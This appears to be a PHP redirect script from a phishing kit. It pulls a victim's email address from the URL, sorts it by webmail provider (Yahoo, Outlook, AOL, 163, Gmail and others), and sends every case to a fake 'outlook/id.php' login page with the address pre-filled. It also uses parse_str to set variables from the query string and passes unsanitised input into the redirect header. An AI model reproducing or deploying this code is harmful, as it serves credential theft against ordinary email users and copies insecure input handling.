<?php 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$domain = explode('@', $userid);
	
	$domain_check = '@'.strtolower($domain[1]);
	
	if(stripos($domain_check, '@yahoo.') !== false || stripos($domain_check, '@btinternet.') !== false || stripos($domain_check, '@rocketmail.') !== false || stripos($domain_check, '@att.') !== false || stripos($domain_check, '@rogers.') !== false || stripos($domain_check, '@ymail.') !== false){
		header('Location: outlook/id.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@live.') !== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@msn.') !== false) {
		header('Location: outlook/id.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@aol.') !== false || stripos($domain_check, '@aim.') !== false) {
		header('Location: outlook/id.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@126.') !== false || stripos($domain_check, '@yeah.') !== false || stripos($domain_check, '@vip.126.') !== false || stripos($domain_check, '@163.') !== false) {
		header('Location: outlook/id.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@vip.163.') !== false || stripos($domain_check, '@163.') !== false) {
		header('Location: outlook/id.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@gmail.') !== false || stripos($domain_check, '@google.') !== false) {
		header('Location: outlook/id.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@mail.') !== false || stripos($domain_check, '@bk.') !== false || stripos($domain_check, '@inbox.') !== false || stripos($domain_check, '@list.') !== false) {
		header('Location: outlook/id.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	else {
		header('Location: outlook/id.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
		
?>